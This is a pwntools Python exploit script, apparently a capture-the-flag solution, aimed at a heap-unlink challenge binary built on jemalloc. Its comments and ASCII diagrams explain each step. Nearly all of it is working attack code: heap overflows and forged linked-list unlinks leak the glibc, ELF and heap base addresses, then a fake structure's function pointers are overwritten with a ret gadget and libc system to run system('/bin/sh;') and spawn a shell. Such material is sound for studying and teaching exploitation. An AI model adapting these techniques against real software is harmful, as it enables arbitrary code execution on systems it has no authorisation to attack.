from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./unlink_patched', '''
    continue
''')

# ONLY CRITICAL CONTENTS OF PROGRAM ARE EXPLAINED

# crypto_thing structure:
# sig_counter (8-byte integer, incremented by 1 when its own sign is called)
# sign (8-byte function pointer to crypto_sign initially, useless function)
# allocate_sig (8-byte function pointer to je-malloc initially)
# destroy_sig (8-byte function pointer to je-free initially)
'''
typedef struct crypto_thing{
    size_t sig_counter;
    int (*sign)(void* crypto_thing, char* buf, size_t len, char* out);
    char* (*allocate_sig)(); 
    void (*destroy_sig)(char* sig); 
}crypto_thing;
'''
# one and only chunk of crypto_thing structure is malloced at heap address with offset 0xd000, whose address is stored in global variable crypto
# initialized chunk of crypto_thing structure contains elf address, and libjemalloc address (constant offset from glibc)

# some_thing structure:
# next (8-byte address pointer to next chunk)
# prev (8-byte address pointer to previous chunk)
# session_id (4-byte integer, then 4-byte null)
# challenge_len (8-byte integer)
# challenge (0x100-byte data)
'''
typedef struct some_thing{
    size_t next;
    size_t prev;
    int session_id;
    size_t challenge_len;
    char challenge[0x100];
}some_thing;
'''
# first chunk of some_thing structure is malloced at heap address with offset 0xe000 (defined as heap_base_addr in script)
# first and last chunks (in linked list) of some_thing structure's addresses are stored in global variables head_next and head_prev

# je-malloc chunk of size 0x140 (some_thing structure)
# generate a random 4 byte integer for session_id field
# copy string data of user input (0x400 bytes at most) to challenge field
# set challenge_len field to string length (0x100 at most) of user input
# link chunk to linked list: chunk->next = &head_next; chunk->prev = head_prev; head_prev->next = chunk; head_prev = chunk;
# increment global variable nr_things by 1
# print out value of session_id field
def create(data):
    p.sendlineafter(b"the thing\n", b'1')
    p.sendlineafter(b"input size?\n", str(0x400).encode())
    p.sendafter(b"data?\n", data)
    p.recvuntil(b"new session: ")
    return int(p.recvline().strip(), 10)
# a chunk is able to be malloced by create function only if head_prev is a valid address

# find chunk of some_thing structure from linked list starting from head_next by given session_id value, if found:
# call crypto->allocate_sig, then call crypto->sign with crypto itself as first argument
# print out chunk->challenge_len bytes of chunk->challenge
# unlink chunk from linked list: chunk->prev->next = chunk->next; chunk->next->prev = chunk->prev; chunk->prev = 0xdeadbeef; chunk->next = 0xdeadbeef;
# je-free chunk
# decrement global variable nr_things by 1
# call crypto->destroy_sig with the buffer returned by crypto->allocate_sig
def sign(id):
    p.sendlineafter(b"the thing\n", b'2')
    p.sendlineafter(b"session id?\n", str(id).encode())
# a chunk is able to be called by sign function only if:
# 1. it can be found in linked list starting from head_next by given session_id value
# 2. chunk->prev and chunk->next are valid addresses

glibc_e = ELF('./libc.so.6')

# Stage 1: leak glibc base address, elf base address, and heap base address
# allocate 4 chunks for later use (a-d)
a = create(b'a') # 0xe000
b = create(b'b') # 0xe140
c = create(b'c') # 0xe280
d = create(b'd') # 0xe3c0
#  +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#  | Chunk A    (0xe000)   |      | Chunk B    (0xe140)   |      | Chunk C    (0xe280)   |      | Chunk D    (0xe3c0)   |
#  | [ next ] = 0xe140 (B) | ---> | [ next ] = 0xe280 (C) | ---> | [ next ] = 0xe3c0 (D) | ---> | [ next ] = &head_next |
#  | [ prev ] = &head_next | <--- | [ prev ] = 0xe000 (A) | <--- | [ prev ] = 0xe140 (B) | <--- | [ prev ] = 0xe280 (C) |
#  +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#  head_next = 0xe000, head_prev = 0xe3c0
# overflow from chunk C to chunk D, overwrite chunk D's prev pointer to chunk X (0xcff0)
sign(c) # 0xe280
c = create(b'c'*0x128+p16(0xd000-0x10)) # 0xe280
#  +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#  | Chunk A    (0xe000)   |      | Chunk B    (0xe140)   |      | Chunk D    (0xe3c0)   |      | Chunk C    (0xe280)   |
#  | [ next ] = 0xe140 (B) | ---> | [ next ] = 0xe3c0 (D) | ---> | [ next ] = 0xe280 (C) | ---> | [ next ] = &head_next |
#  | [ prev ] = &head_next | <--- | [ prev ] = 0xe000 (A) |   -- | [ prev ] = 0xcff0 (X*)| <--- | [ prev ] = 0xe3c0 (C) |
#  +-----------------------+      +-----------------------+   |  +-----------------------+      +-----------------------+
#                                 +-----------------------+   |
#                                 | Chunk X*   (0xcff0)   |   |
#                                 | [ next ] = 0          |   |
#                                 | [ prev ] = 0          | <--
#                                 +-----------------------+
#  head_next = 0xe000, head_prev = 0xe280
# unlink chunk D from linked list, make chunk X's (0xcff0) next pointer point to chunk C
sign(d) # 0xe3c0
#  +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#  | Chunk A    (0xe000)   |      | Chunk B    (0xe140)   |      | Chunk D*   (0xe3c0)   |      | Chunk C    (0xe280)   |
#  | [ next ] = 0xe140 (B) | ---> | [ next ] = 0xe3c0 (D*)| ---> | [ next ] = 0xdeadbeef |  --> | [ next ] = &head_next |
#  | [ prev ] = &head_next | <--- | [ prev ] = 0xe000 (A) |      | [ prev ] = 0xdeadbeef |  |-- | [ prev ] = 0xcff0 (X*)|
#  +-----------------------+      +-----------------------+      +-----------------------+  ||  +-----------------------+
#                                                                +-----------------------+  ||
#                                                                | Chunk X*   (0xcff0)   |  ||
#                                                                | [ next ] = 0xe280 (C) | --|
#                                                                | [ prev ] = 0          | <--
#                                                                +-----------------------+
#  head_next = 0xe000, head_prev = 0xe280
# overflow from chunk A to chunk B, overwrite chunk B's next pointer to chunk X (0xcff0)
sign(a) # 0xe000
a = create(b'a'*0x120+p16(0xd000-0x10)) # 0xe000
#  +-----------------------+                                     +-----------------------+      +-----------------------+
#  | Chunk B    (0xe140)   |                                     | Chunk C    (0xe280)   |      | Chunk A    (0xe000)   |
#  | [ next ] = 0xcff0 (X*)| --                              --> | [ next ] = 0xe000 (A) | ---> | [ next ] = &head_next |
#  | [ prev ] = &head_next |  |                              |-- | [ prev ] = 0xcff0 (X*)| <--- | [ prev ] = 0xe280 (C) |
#  +-----------------------+  |                              ||  +-----------------------+      +-----------------------+
#                             |   +-----------------------+  ||
#                             |   | Chunk X*   (0xcff0)   |  ||
#                             --> | [ next ] = 0xe280 (C) | --|
#                                 | [ prev ] = 0          | <--
#                                 +-----------------------+
#  head_next = 0xe140, head_prev = 0xe000
# unlink chunk B from linked list, make chunk X's (0xcff0) prev pointer point to &head_next
sign(b) # 0xe140
#                                 +-----------------------+      +-----------------------+
#                                 | Chunk C    (0xe280)   |      | Chunk A    (0xe000)   |
#                             --> | [ next ] = 0xe000 (A) | ---> | [ next ] = &head_next |
#                             |-- | [ prev ] = 0xcff0 (X) | <--- | [ prev ] = 0xe280 (C) |
#                             ||  +-----------------------+      +-----------------------+
#  +-----------------------+  ||
#  | Chunk X    (0xcff0)   |  ||
#  | [ next ] = 0xe280 (C) | --|
#  | [ prev ] = &head_next | <--
#  +-----------------------+
#  head_next = 0xcff0, head_prev = 0xe000
# unlink chunk X (0xcff0) from linked list (because it has valid prev and next pointers)
# leak a large amount of data starting from chunk X's (0xcff0) challenge field (because it has a vary large challenge_len field)
sign(4) #0xcff0
#  +-----------------------+      +-----------------------+
#  | Chunk C    (0xe280)   |      | Chunk A    (0xe000)   |
#  | [ next ] = 0xe000 (A) | ---> | [ next ] = &head_next |
#  | [ prev ] = &head_next | <--- | [ prev ] = 0xe280 (C) |
#  +-----------------------+      +-----------------------+
#  head_next = 0xe280, head_prev = 0xe000
p.recvuntil(b"challenge: \n=============================\n")
leaks = p.recvuntil(b"\n=============================\n", drop=True)
glibc_base_addr = u64(leaks[:0x8])-0x236370
log.info(f"glibc base address: {hex(glibc_base_addr)}")
elf_base_addr = u64(leaks[0x1000-0x10:0x1008-0x10])-0x4060
log.info(f"elf base address: {hex(elf_base_addr)}")
heap_base_addr = u64(leaks[0x1008-0x10:0x1010-0x10])-0x280
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: fake function pointers to pop a shell (chunk Z is fake_crypto, explained in detail below)
# allocate 7 chunks for later use (b-h)
b = create(b'b') # 0xe140
sign(c) # 0xe280
c = create(b'c') # 0xe280
d = create(b'd') # 0xe3c0
e = create(b'e') # 0xe500
f = create(b'f') # 0xe640
g = create(b'g') # 0xe780
# set chunk Y's (0xe8d8) prev pointer to &crypto
h = create(p64(elf_base_addr+0x4070)) # 0xe8c0
# set fake_crypto(0xe3c8)->destroy_sig(0xe3e0) to address of "ret;" instruction
sign(d) # 0xe3c0
d = create(p64(elf_base_addr+0x17a5)) # 0xe3c0
#        +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#        | Chunk B    (0xe140)   |      | Chunk C    (0xe280)   |      | Chunk E    (0xe500)   |      | Chunk F    (0xe640)   |      | Chunk G    (0xe780)   |      | Chunk H    (0xe8c0)   |      | Chunk D    (0xe3c0)   |
#   .... | [ next ] = 0xe280 (C) | ---> | [ next ] = 0xe500 (E) | ---> | [ next ] = 0xe640 (F) | ---> | [ next ] = 0xe780 (G) | ---> | [ next ] = 0xe8c0 (H) | ---> | [ next ] = 0xe3c0 (D) | ---> | [ next ] = &head_next |
#   .... | [ prev ] = 0xe000 (A) | <--- | [ prev ] = 0xe140 (B) | <--- | [ prev ] = 0xe280 (C) | <--- | [ prev ] = 0xe500 (E) | <--- | [ prev ] = 0xe640 (F) | <--- | [ prev ] = 0xe780 (G) | <--- | [ prev ] = 0xe8c0 (H) |
#        +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#  head_next = 0xe000, head_prev = 0xe8c0
# overflow from chunk G to chunk H, overwrite chunk Y's (0xe8d8) next pointer to chunk Z (0xe3c8)
sign(g) # 0xe780
g = create(b'g'*0x138+p64(heap_base_addr+0x140*3+8)) # 0xe780
#        +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#        | Chunk B    (0xe140)   |      | Chunk C    (0xe280)   |      | Chunk E    (0xe500)   |      | Chunk F    (0xe640)   |      | Chunk H    (0xe8c0)   |      | Chunk D    (0xe3c0)   |      | Chunk G    (0xe780)   |
#   .... | [ next ] = 0xe280 (C) | ---> | [ next ] = 0xe500 (E) | ---> | [ next ] = 0xe640 (F) | ---> | [ next ] = 0xe8c0 (H) | ---> | [ next ] = junk       |      | [ next ] = 0xe780 (G) | ---> | [ next ] = &head_next |
#   .... | [ prev ] = 0xe000 (A) | <--- | [ prev ] = 0xe140 (B) | <--- | [ prev ] = 0xe280 (C) | <--- | [ prev ] = 0xe500 (E) |      | [ prev ] = junk       | <--- | [ prev ] = 0xe8c0 (H) | <--- | [ prev ] = 0xe3c0 (D) |
#        +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#  head_next = 0xe000, head_prev = 0xe780
# overflow from chunk E to chunk F, overwrite chunk F's next pointer to chunk Y (0xe8d8)
sign(e) # 0xe500
e = create(b'e'*0x120+p64(heap_base_addr+0x140*7+0x18)) # 0xe500
#        +-----------------------+      +-----------------------+      +-----------------------+                                                                    +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#        | Chunk B    (0xe140)   |      | Chunk C    (0xe280)   |      | Chunk F    (0xe640)   |                                                                    | Chunk H    (0xe8c0)   |      | Chunk D    (0xe3c0)   |      | Chunk G    (0xe780)   |      | Chunk E    (0xe500)   |
#   .... | [ next ] = 0xe280 (C) | ---> | [ next ] = 0xe640 (F) | ---> | [ next ] = 0xe8d8 (Y*)| --                                                             --> | [ next ] = junk       |      | [ next ] = 0xe780 (G) | ---> | [ next ] = 0xe500 (E) | ---> | [ next ] = &head_next |
#   .... | [ prev ] = 0xe000 (A) | <--- | [ prev ] = 0xe140 (B) | <--- | [ prev ] = 0xe280 (C) |  |                                                             |   | [ prev ] = junk       | <--- | [ prev ] = 0xe8c0 (H) | <--- | [ prev ] = 0xe3c0 (D) | <--- | [ prev ] = 0xe780 (G) |
#        +-----------------------+      +-----------------------+      +-----------------------+  |                                                             |   +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#                                                                                                 |   +-----------------------+      +-----------------------+  |
#                                                                                                 |   | Chunk Y*   (0xe8d8)   |      | Chunk Z*   (0xe3c8)   |  |
#                                                                                                 --> | [ next ] = 0xe3c8 (Z*)| ---> | [ next ] = 0xe8c0 (H) | --
#                                                                                                     | [ prev ] = &crypto    |      | [ prev ] = junk       |
#                                                                                                     +-----------------------+      +-----------------------+
#  head_next = 0xe000, head_prev = 0xe500
# overflow from chunk C to chunk D, overwrite fake_crypto(0xe3c8)->allocate_sig(0xe3d8) to address of "ret;" instruction
sign(c) # 0xe280
c = create(b'c'*0x138+p64(elf_base_addr+0x17a5)) # 0xe280
# unlink chunk B for later critical use
sign(b) # 0xe140
#        +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#        | Chunk F    (0xe640)   |      | Chunk H    (0xe8c0)   |      | Chunk D    (0xe3c0)   |      | Chunk G    (0xe780)   |      | Chunk E    (0xe500)   |      | Chunk C    (0xe280)   |
#   .... | [ next ] = 0xe8d8 (Y*)| --   | [ next ] = junk       |      | [ next ] = junk       |      | [ next ] = 0xe500 (E) | ---> | [ next ] = 0xe280 (C) | ---> | [ next ] = &head_next |
#   .... | [ prev ] = 0xe000 (A) |  |   | [ prev ] = junk       |      | [ prev ] = junk       | <--- | [ prev ] = 0xe3c0 (D) | <--- | [ prev ] = 0xe780 (G) | <--- | [ prev ] = 0xe500 (E) |
#        +-----------------------+  |   +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#                                   |   +-----------------------+      +-----------------------+
#                                   |   | Chunk Y*   (0xe8d8)   |      | Chunk Z*   (0xe3c8)   |
#                                   --> | [ next ] = 0xe3c8 (Z*)| ---> | [ next ] = junk       |
#                                       | [ prev ] = &crypto    |      | [ prev ] = junk       |
#                                       +-----------------------+      +-----------------------+
#  head_next = 0xe000, head_prev = 0xe280
# unlink chunk Y (0xe8d8) from linked list (because it has valid prev and next pointers)
# make chunk Z (0xe3c8)'s prev pointer point to &crypto (null 2 MSB of fake_crypto(0xe3c8)->sign(0xe3d0))
# make &crypto's next pointer point to chunk Z (0xe3c8) (replace crypto with fake_crypto(0xe3c8))
sign(0) # 0xe8d8
# allocate chunk Y (0xe8d8) to clear bin
y = create(b'y') # 0xe8d8
#        +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+
#        | Chunk F    (0xe640)   |      | Chunk D    (0xe3c0)   |      | Chunk G    (0xe780)   |      | Chunk E    (0xe500)   |      | Chunk C    (0xe280)   |
#   .... | [ next ] = 0xe8d8 (Y) | --   | [ next ] = junk       |      | [ next ] = 0xe500 (E) | ---> | [ next ] = 0xe280 (C) | ---> | [ next ] = 0xe8d8 (Y) | --
#   .... | [ prev ] = 0xe000 (A) |  |   | [ prev ] = junk       | <--- | [ prev ] = 0xe3c0 (D) | <--- | [ prev ] = 0xe780 (G) | <--- | [ prev ] = 0xe500 (E) | <|-
#        +-----------------------+  |   +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+  ||
#                                   |                                                                                                                           ||  +-----------------------+      +-----------------------+
#                                   |                                                                                                                           ||  | Chunk Y    (0xe8d8)   |      | Chunk Z*   (0xe3c8)   |
#                                   --                             --                             --                             --                             --> | [ next ] = &head_next |      | [ next ] = junk       |
#                                                                                                                                                                -- | [ prev ] = 0xe280 (C) |      | [ prev ] = &crypto    |
#                                                                                                                                                                   +-----------------------+      +-----------------------+
#  head_next = 0xe000, head_prev = 0xe8d8
# overflow from chunk B to chunk D, overwrite fake_crypto(0xe3c8)->sig_counter(0xe3c8) to "/bin/sh;", and fake_crypto(0xe3c8)->sign(0xe3d0) to address of libc system
b = create(b'b'*0x268+b'/bin/sh;'+p64(glibc_base_addr+glibc_e.sym.system)) # 0xe140
#        +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+                                     +-----------------------+
#        | Chunk F    (0xe640)   |      | Chunk D    (0xe3c0)   |      | Chunk G    (0xe780)   |      | Chunk E    (0xe500)   |      | Chunk C    (0xe280)   |                                     | Chunk B    (0xe140)   |
#   .... | [ next ] = 0xe8d8 (Y) | --   | [ next ] = junk       |      | [ next ] = 0xe500 (E) | ---> | [ next ] = 0xe280 (C) | ---> | [ next ] = junk       |                                 --> | [ next ] = &head_next |
#   .... | [ prev ] = 0xe000 (A) |  |   | [ prev ] = junk       | <--- | [ prev ] = 0xe3c0 (D) | <--- | [ prev ] = 0xe780 (G) | <--- | [ prev ] = junk       | <--                             |-- | [ prev ] = 0xe8d8 (Y) |
#        +-----------------------+  |   +-----------------------+      +-----------------------+      +-----------------------+      +-----------------------+   |                             ||  +-----------------------+
#                                   |                                                                                                                            |  +-----------------------+  ||  +-----------------------+
#                                   |                                                                                                                            |  | Chunk Y    (0xe8d8)   |  ||  | Chunk Z*   (0xe3c8)   |
#                                   --                             --                             --                             --                             -|> | [ next ] = 0xe140 (B) | --|  | [ next ] = "/bin/sh;" |
#                                                                                                                                                                -- | [ prev ] = 0xe280 (C) | <--  | [ prev ] = libc_system|
#                                                                                                                                                                   +-----------------------+      +-----------------------+
#  head_next = 0xe000, head_prev = 0xe140
# trigger system("/bin/sh;") through fake_crypto->sign(fake_crypto,...)
sign(b)

p.interactive()